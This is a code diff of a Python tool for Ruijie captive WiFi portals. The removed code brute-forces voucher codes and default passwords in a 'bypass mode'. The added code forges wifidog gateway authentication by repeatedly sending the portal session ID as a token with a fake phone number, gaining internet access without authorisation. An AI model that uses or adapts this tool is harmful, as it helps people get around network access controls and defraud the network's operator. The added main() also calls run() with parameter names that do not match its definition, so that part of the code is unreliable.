@@ -1,23 +1,22 @@
 #!/usr/bin/env python3
 """
-Ruijie WiFi Portal Auto-Login Tool
-Reimplemented from reverse-engineered core.so.
-Works on Kali Linux when connected to a Ruijie campus WiFi network.
+Ruijie WiFi Portal Tool
+Wifidog-based session keep-alive for Ruijie captive portals.
 """
 
 import argparse
-import asyncio
-import hashlib
-import json
 import logging
-import random
 import re
-import string
+import signal
 import sys
-from pathlib import Path
-from urllib.parse import unquote
+import threading
+import time
+from urllib.parse import urljoin, urlparse, parse_qs
 
-import aiohttp
+import requests
+import urllib3
+
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 logging.basicConfig(
     level=logging.INFO,
@@ -25,18 +24,6 @@ logging.basicConfig(
     datefmt="%H:%M:%S",
 )
 log = logging.getLogger("ruijie")
-
-CONFIG_DIR = Path.home() / ".config" / "ruijie"
-CONFIG_FILE = CONFIG_DIR / "config.json"
-PORTAL_BASE = "https://portal-as.ruijienetworks.com"
-PORTAL_FALLBACKS = [
-    "https://cloud-as.ruijienetworks.com",
-    "https://portal-as.ruijienetworks.com",
-    "http://172.16.0.1",
-    "http://10.10.10.1",
-    "http://192.168.1.1",
-    "http://192.168.0.1",
-]
 
 BANNER = r"""
   _____  _    _ _____       _ _____ ______
@@ -48,466 +35,122 @@ BANNER = r"""
 """
 
 
-class Config:
-    def __init__(self):
-        self.data = {}
-        self.load()
-
-    def get(self, key, default=None):
-        return self.data.get(key, default)
-
-    def set(self, key, val):
-        self.data[key] = val
-        self.save()
-
-    @property
-    def portal_domain(self):
-        return self.get("portal_domain", PORTAL_BASE)
-
-    @portal_domain.setter
-    def portal_domain(self, val):
-        self.set("portal_domain", val)
-
-    @property
-    def voucher(self):
-        return self.get("voucher", "")
-
-    @voucher.setter
-    def voucher(self, val):
-        self.set("voucher", val)
-
-    def load(self):
-        CONFIG_DIR.mkdir(parents=True, exist_ok=True)
-        if CONFIG_FILE.exists():
-            try:
-                self.data = json.loads(CONFIG_FILE.read_text())
-            except Exception:
-                self.data = {}
-        else:
-            self.data = {}
-
-    def save(self):
-        CONFIG_DIR.mkdir(parents=True, exist_ok=True)
-        CONFIG_FILE.write_text(json.dumps(self.data, indent=2))
-
-
-def chap_md5(chap_id: str, password: str, challenge: str) -> str:
-    mid = bytes.fromhex(chap_id) if re.match(r'^[0-9a-f]{2}$', chap_id, re.I) else chap_id.encode()
-    ch = bytes.fromhex(challenge) if re.match(r'^[0-9a-f]{32}$', challenge, re.I) else challenge.encode()
-    m = hashlib.md5()
-    m.update(mid)
-    m.update(password.encode())
-    m.update(ch)
-    return m.hexdigest().lower()
-
-
-class PortalSession:
-    def __init__(self):
-        self.session_id = ""
-        self.chap_id = ""
-        self.chap_challenge = ""
-        self.auth_url = ""
-        self.logout_url = ""
-        self.username = ""
-        self.access_code = ""
-
-
-async def fetch_portal(session: aiohttp.ClientSession, domain: str) -> PortalSession:
-    ps = PortalSession()
+def check_internet():
     try:
-        r = await session.get(domain, allow_redirects=True, timeout=aiohttp.ClientTimeout(total=15))
-        html = await r.text()
-
-        m = re.search(r'sessionId[=:][\s"\']*([a-zA-Z0-9]+)', html)
-        ps.session_id = m.group(1) if m else ""
-
-        m = re.search(r"chap_id=([^&]+)&chap_challenge=([^'>\s]+)", html)
-        if m:
-            ps.chap_id = unquote(m.group(1))
-            ps.chap_challenge = unquote(m.group(2))
-
-        m = re.search(r'action=["\']([^"\']+(?:login|auth)[^"\']*)', html, re.I)
-        if m:
-            ps.auth_url = m.group(1).replace("&amp;", "&")
-        if not ps.auth_url:
-            m = re.search(r'(https?://[^"\']*(?:login|auth)[^"\'\s]*)', html, re.I)
-            ps.auth_url = m.group(1) if m else ""
-
-        m = re.search(r'action=["\']([^"\']+logout[^"\']*)', html, re.I)
-        if m:
-            ps.logout_url = m.group(1).replace("&amp;", "&")
-        if not ps.logout_url:
-            m = re.search(r'(https?://[^"\']*logout[^"\'\s]*)', html, re.I)
-            ps.logout_url = m.group(1) if m else ""
-
-        m = re.search(r'accessCode[=:][\s"\']*([a-zA-Z0-9]+)', html)
-        ps.access_code = m.group(1) if m else ""
-    except Exception as e:
-        log.error(f"Failed to fetch portal: {e}")
-    return ps
-
-
-async def authenticate(session: aiohttp.ClientSession, ps: PortalSession, password: str = "") -> bool:
-    if not ps.auth_url:
-        log.error("No auth URL found")
-        return False
-    chap_id = ps.chap_id or "01"
-    challenge = ps.chap_challenge or ("00" * 16)
-    pwd_hash = chap_md5(chap_id, password or "123456", challenge)
-    log.info(f"CHAP id={chap_id} hash={pwd_hash[:16]}...")
-    data = {
-        "auth_type": "PAP",
-        "username": ps.username or "guest",
-        "password": pwd_hash,
-        "sessionId": ps.session_id,
-    }
-    if ps.access_code:
-        data["accessCode"] = ps.access_code
-    try:
-        r = await session.post(ps.auth_url, data=data, timeout=aiohttp.ClientTimeout(total=15))
-        text = await r.text()
-        log.info(f"Auth: {r.status} {text[:150]}")
-        return r.status == 200 and ("success" in text.lower() or "ok" in text.lower())
-    except Exception as e:
-        log.error(f"Auth failed: {e}")
-        return False
-
-
-async def redeem_voucher(session: aiohttp.ClientSession, voucher: str) -> bool:
-    url = f"{PORTAL_BASE}/api/auth/voucher/?lang=en_US"
-    try:
-        r = await session.post(url, json={"auth_type": "VOUCHER", "voucher_code": voucher},
-                               timeout=aiohttp.ClientTimeout(total=15))
-        if r.status == 200:
-            result = await r.json()
-            log.info(f"Voucher: {result}")
-            return bool(result.get("success", False) or result.get("status") == "ok")
-        log.warning(f"Voucher {r.status}: {(await r.text())[:200]}")
-        return False
-    except Exception as e:
-        log.error(f"Voucher failed: {e}")
-        return False
-
-
-async def check_internet(session: aiohttp.ClientSession) -> bool:
-    try:
-        import ping3
-        rtt = ping3.ping("google.com", timeout=3)
-        if rtt is not None:
-            return True
-    except ImportError:
-        pass
-    try:
-        r = await session.get("https://httpbin.org/get", timeout=aiohttp.ClientTimeout(total=5))
-        return r.status == 200
+        return requests.get("http://www.google.com", timeout=3).status_code == 200
     except Exception:
         return False
 
 
-COMMON_VOUCHERS = [
-    "123456", "000000", "111111", "222222", "333333", "444444",
-    "555555", "666666", "777777", "888888", "999999", "123123",
-    "12345678", "00000000", "121212", "654321", "66666666",
-    "88888888", "1234", "0000", "1111", "2222", "3333", "4444",
-    "guest", "GUEST", "free", "FREE", "wifi", "WIFI",
-    "123456789", "987654321", "100000", "200000", "300000",
-    "admin", "root", "test", "demo", "user", "pass",
-]
-
-
-def random_voucher(length: int = 6) -> str:
-    return "".join(random.choices(string.digits, k=length))
-
-
-async def detect_portal(session: aiohttp.ClientSession) -> str:
-    """Try to auto-detect the captive portal URL by following redirects."""
-    probe_urls = [
-        "http://connectivitycheck.gstatic.com",
-        "http://captive.apple.com",
-        "http://google.com",
-    ]
-    portal_keywords = ["login", "portal", "auth", "wifidog", "ruijie", "authenticate",
-                       "captive", "redirect", "connect", "signin", "userauth"]
-    for url in probe_urls:
+def ping_wifidog(auth_link, session, sid, interval=0.1):
+    while True:
         try:
-            r = await session.get(url, allow_redirects=True, timeout=aiohttp.ClientTimeout(total=10))
-            final = str(r.url)
-            # Check if redirected to a different domain
-            if url.rstrip("/") in final.rstrip("/") or final.rstrip("/") == url.rstrip("/"):
+            session.get(auth_link, timeout=5)
+            log.debug(f"Pinging SID: {sid}")
+        except Exception:
+            break
+        time.sleep(interval)
+
+
+def run(ping_threads=5, ping_interval=0.1, access_code="123456"):
+    log.info("Starting Ruijie portal session keeper...")
+    sess = requests.Session()
+
+    while True:
+        try:
+            # 1. Detect portal via redirect
+            r = requests.get("http://connectivitycheck.gstatic.com/generate_204",
+                           allow_redirects=True, timeout=5)
+            if r.url == "http://connectivitycheck.gstatic.com/generate_204":
+                if check_internet():
+                    time.sleep(5)
+                    continue
+                else:
+                    time.sleep(2)
+                    continue
+
+            portal_url = r.url
+            parsed = urlparse(portal_url)
+            portal_host = f"{parsed.scheme}://{parsed.netloc}"
+            log.info(f"[*] Portal: {portal_url}")
+
+            # 2. Follow JS redirect (location.href)
+            r1 = sess.get(portal_url, verify=False, timeout=10)
+            m = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", r1.text)
+            next_url = urljoin(portal_url, m.group(1)) if m else portal_url
+            r2 = sess.get(next_url, verify=False, timeout=10)
+
+            # 3. Extract SID
+            sid = parse_qs(urlparse(r2.url).query).get("sessionId", [None])[0]
+            if not sid:
+                m = re.search(r"sessionId=([a-zA-Z0-9]+)", r2.text)
+                sid = m.group(1) if m else None
+
+            if not sid:
+                log.warning("[-] No SID found, retrying...")
+                time.sleep(3)
                 continue
-            # Check URL for portal keywords
-            if any(k in final.lower() for k in portal_keywords):
-                log.info(f"[*] Portal detected: {final}")
-                return final
-            # Check page content for portal keywords
+
+            log.info(f"[+] SID: {sid}")
+
+            # 4. Activate voucher API
+            voucher_api = f"{portal_host}/api/auth/voucher/"
             try:
-                text = (await r.text()).lower()[:3000]
-                if any(k in text for k in portal_keywords):
-                    log.info(f"[*] Portal detected (by content): {final}")
-                    return final
-            except Exception:
-                pass
-        except (aiohttp.ClientError, asyncio.TimeoutError):
-            continue
-    return ""
+                v = sess.post(voucher_api, json={
+                    "accessCode": access_code,
+                    "sessionId": sid,
+                    "apiVersion": 1,
+                }, timeout=5)
+                log.info(f"[*] Voucher API: {v.status_code}")
+            except Exception as e:
+                log.warning(f"[!] Voucher API failed: {e}")
 
+            # 5. Get gateway info from portal URL params
+            params = parse_qs(parsed.query)
+            gw_addr = params.get("gw_address", ["192.168.60.1"])[0]
+            gw_port = params.get("gw_port", ["2060"])[0]
+            auth_link = f"http://{gw_addr}:{gw_port}/wifidog/auth?token={sid}&phonenumber=12345"
 
-async def try_bypass(session: aiohttp.ClientSession, config: Config, max_attempts: int = 200) -> bool:
-    log.info("=" * 50)
-    log.info("BYPASS MODE: Trying to get online without a voucher")
-    log.info("=" * 50)
+            log.info(f"[*] Gateway: {gw_addr}:{gw_port}")
+            log.info(f"[*] Starting {ping_threads} ping threads...")
 
-    domain = config.portal_domain
+            for _ in range(ping_threads):
+                t = threading.Thread(
+                    target=ping_wifidog,
+                    args=(auth_link, sess, sid, ping_interval),
+                    daemon=True,
+                )
+                t.start()
 
-    if await check_internet(session):
-        log.info("[+] Already online!")
-        return True
+            # 6. Monitor internet
+            log.info("[+] Online! Watching connection (Ctrl+C to stop)")
+            while check_internet():
+                time.sleep(5)
 
-    ps = await fetch_portal(session, domain)
-    if not ps.auth_url:
-        log.error("[-] No portal found. Are you connected to Ruijie WiFi?")
-        return False
+            log.warning("[-] Connection lost, reconnecting...")
 
-    log.info(f"[*] Portal found: {ps.auth_url}")
-    log.info(f"[*] Session: {ps.session_id}")
-    log.info(f"[*] CHAP id={ps.chap_id} challenge={ps.chap_challenge}")
-
-    # Strategy 1: Try empty/null password
-    log.info("[1/4] Trying empty/null auth...")
-    if await authenticate(session, ps, ""):
-        log.info("[+] Empty auth worked!")
-        return True
-    if await authenticate(session, ps, "000000"):
-        log.info("[+] Null auth worked!")
-        return True
-
-    # Strategy 2: Try common voucher codes
-    log.info(f"[2/4] Trying {len(COMMON_VOUCHERS)} common voucher codes...")
-    for i, code in enumerate(COMMON_VOUCHERS, 1):
-        ok = await redeem_voucher(session, code)
-        if ok:
-            log.info(f"[+] Voucher found: {code}")
-            config.voucher = code
-            return True
-        if i % 20 == 0:
-            log.info(f"    ... tried {i}/{len(COMMON_VOUCHERS)}")
-
-    if await check_internet(session):
-        log.info("[+] Internet working after common codes!")
-        return True
-
-    # Strategy 3: Try random numeric vouchers
-    log.info(f"[3/4] Trying {max_attempts} random voucher codes...")
-    tried = set()
-    for i in range(max_attempts):
-        code = random_voucher()
-        while code in tried:
-            code = random_voucher()
-        tried.add(code)
-
-        ok = await redeem_voucher(session, code)
-        if ok:
-            log.info(f"[+] Random voucher found: {code}")
-            config.voucher = code
-            return True
-        if i % 50 == 0 and i > 0:
-            log.info(f"    ... tried {i}/{max_attempts}")
-            if await check_internet(session):
-                log.info("[+] Internet working!")
-                return True
-
-    # Strategy 4: Try direct PAP auth with various passwords
-    log.info("[4/4] Trying direct PAP auth with common passwords...")
-    for pwd in ["123456", "guest", "password", "000000", "111111", "admin", ""]:
-        ps2 = await fetch_portal(session, domain)
-        if await authenticate(session, ps2, pwd):
-            log.info(f"[+] Direct auth worked with password: {pwd or '(empty)'}")
-            return True
-
-    log.info("[-] All bypass attempts failed")
-    return False
-
-
-async def ensure_portal(session: aiohttp.ClientSession, config: Config):
-    """Auto-detect portal if current domain doesn't respond."""
-    ps = await fetch_portal(session, config.portal_domain)
-    if ps.auth_url or ps.session_id:
-        return ps
-    log.info("[*] Default portal not found, trying fallback domains...")
-    for domain in PORTAL_FALLBACKS:
-        if domain == config.portal_domain:
-            continue
-        ps = await fetch_portal(session, domain)
-        if ps.auth_url or ps.session_id:
-            log.info(f"[*] Found portal: {domain}")
-            config.portal_domain = domain
-            return ps
-    log.info("[*] No fallback worked, trying auto-detect via redirect...")
-    detected_url = await detect_portal(session)
-    if detected_url:
-        from yarl import URL
-        u = URL(detected_url)
-        base = f"{u.scheme}://{u.host}"
-        if u.port and u.port not in (80, 443):
-            base += f":{u.port}"
-        log.info(f"[*] Setting portal domain to: {base}")
-        config.portal_domain = base
-        ps2 = await fetch_portal(session, base)
-        if ps2.auth_url or ps2.session_id:
-            return ps2
-    log.warning("[-] Could not detect portal. Run: ./ruijie status")
-    log.warning("    Then check your browser URL and set it with: ./ruijie set-domain <url>")
-    return ps
-
-
-async def cmd_bypass(max_attempts: int, config: Config):
-    headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"}
-    async with aiohttp.ClientSession(headers=headers) as session:
-        ps = await ensure_portal(session, config)
-        if not ps.auth_url:
-            log.error("[-] No portal found. Check your browser URL and use: ./ruijie set-domain <url>")
-            return
-        ok = await try_bypass(session, config, max_attempts)
-        if ok:
-            log.info("[+] Bypass successful! You should have internet access.")
-        else:
-            log.info("[-] Bypass failed.")
-
-
-async def cmd_bypass_monitor(interval: int, max_attempts: int, config: Config):
-    headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"}
-    async with aiohttp.ClientSession(headers=headers) as session:
-        log.info(f"Bypass monitor every {interval}s (Ctrl+C to stop)")
-        await ensure_portal(session, config)
-        if not await check_internet(session):
-            log.info("[*] Offline, starting bypass...")
-            await try_bypass(session, config, max_attempts)
-        try:
-            while True:
-                online = await check_internet(session)
-                sym = "\033[1;32mONLINE\033[0m" if online else "\033[1;31mOFFLINE\033[0m"
-                log.info(f"{sym}")
-                if not online:
-                    await try_bypass(session, config, max_attempts)
-                await asyncio.sleep(interval)
-        except (asyncio.CancelledError, KeyboardInterrupt):
-            log.info("Monitor stopped")
-
-
-async def cmd_login(voucher: str, config: Config):
-    headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"}
-    async with aiohttp.ClientSession(headers=headers) as session:
-        log.info(f"Fetching portal: {config.portal_domain}")
-        ps = await ensure_portal(session, config)
-        if not ps.auth_url:
-            log.error("[-] No portal found. Check your browser URL and use: ./ruijie set-domain <url>")
-            return
-        log.info(f"Session: {ps.session_id or 'N/A'}")
-        log.info(f"CHAP id={ps.chap_id or 'N/A'} challenge={(ps.chap_challenge or '')[:16]}...")
-        if voucher:
-            await redeem_voucher(session, voucher)
-        else:
-            await authenticate(session, ps, config.voucher)
-
-
-async def cmd_monitor(interval: int, config: Config):
-    headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"}
-    async with aiohttp.ClientSession(headers=headers) as session:
-        log.info(f"Monitoring every {interval}s (Ctrl+C to stop)")
-        await ensure_portal(session, config)
-        try:
-            while True:
-                online = await check_internet(session)
-                sym = "\033[1;32mONLINE\033[0m" if online else "\033[1;31mOFFLINE\033[0m"
-                log.info(f"{sym}")
-                if not online:
-                    ps = await fetch_portal(session, config.portal_domain)
-                    await authenticate(session, ps, config.voucher)
-                await asyncio.sleep(interval)
-        except (asyncio.CancelledError, KeyboardInterrupt):
-            log.info("Monitor stopped")
-
-
-async def cmd_status(config: Config):
-    headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"}
-    async with aiohttp.ClientSession(headers=headers) as session:
-        online = await check_internet(session)
-        log.info(f"Internet: {'ONLINE' if online else 'OFFLINE'}")
-        ps = await ensure_portal(session, config)
-        log.info(f"Session: {ps.session_id or 'N/A'}")
-
-        try:
-            r = await session.get(f"{config.portal_domain}/username_get", timeout=aiohttp.ClientTimeout(total=10))
-            uname = (await r.text()).strip() if r.status == 200 else "N/A"
-        except Exception:
-            uname = "N/A"
-        log.info(f"Username: {uname}")
-
-        try:
-            r = await session.get(f"{config.portal_domain}/user/online_info", timeout=aiohttp.ClientTimeout(total=10))
-            oinfo = await r.json() if r.status == 200 else "N/A"
-        except Exception:
-            oinfo = "N/A"
-        log.info(f"Online info: {oinfo}")
-
-        if config.voucher:
-            log.info(f"Saved voucher: {config.voucher[:4]}****")
-
-
-async def cmd_logout(config: Config):
-    headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"}
-    async with aiohttp.ClientSession(headers=headers) as session:
-        ps = await ensure_portal(session, config)
-        url = ps.logout_url or f"{config.portal_domain}/logout"
-        try:
-            r = await session.get(url, timeout=aiohttp.ClientTimeout(total=10))
-            log.info(f"Logged out" if r.status == 200 else "Logout failed")
+        except KeyboardInterrupt:
+            log.info("Stopped")
+            break
         except Exception as e:
-            log.error(f"Logout failed: {e}")
-
-
-async def main_async():
-    print(BANNER)
-    parser = argparse.ArgumentParser(description="Ruijie WiFi Portal Tool")
-    parser.add_argument("action", nargs="?", default="status",
-                        choices=["bypass", "bypass-monitor", "login", "monitor", "status", "logout", "set-domain"])
-    parser.add_argument("value", nargs="?", default="", help="Voucher code or domain URL")
-    parser.add_argument("-i", "--interval", type=int, default=30, help="Monitor interval (seconds)")
-    parser.add_argument("-m", "--max", type=int, default=200, help="Max random voucher attempts")
-    args = parser.parse_args()
-
-    config = Config()
-
-    try:
-        import uvloop
-        uvloop.install()
-    except ImportError:
-        pass
-
-    if args.action == "set-domain":
-        config.portal_domain = args.value.rstrip("/")
-        log.info(f"Portal domain set to: {config.portal_domain}")
-    elif args.action == "bypass":
-        await cmd_bypass(args.max, config)
-    elif args.action == "bypass-monitor":
-        await cmd_bypass_monitor(args.interval, args.max, config)
-    elif args.action == "login":
-        await cmd_login(args.value, config)
-    elif args.action == "monitor":
-        await cmd_monitor(args.interval, config)
-    elif args.action == "status":
-        await cmd_status(config)
-    elif args.action == "logout":
-        await cmd_logout(config)
-    else:
-        parser.print_help()
+            log.debug(f"Error: {e}")
+            time.sleep(5)
 
 
 def main():
-    try:
-        asyncio.run(main_async())
-    except KeyboardInterrupt:
-        log.info("Interrupted")
+    print(BANNER)
+    parser = argparse.ArgumentParser(description="Ruijie WiFi Portal Tool")
+    parser.add_argument("-t", "--threads", type=int, default=5, help="Ping threads")
+    parser.add_argument("-i", "--interval", type=float, default=0.1, help="Ping interval (seconds)")
+    parser.add_argument("-c", "--code", type=str, default="123456", help="Access code")
+    args = parser.parse_args()
+
+    def sigint(sig, frame):
+        log.info("Stopped")
+        sys.exit(0)
+
+    signal.signal(signal.SIGINT, sigint)
+    run(threads=args.threads, interval=args.interval, code=args.code)
 
 
 if __name__ == "__main__":
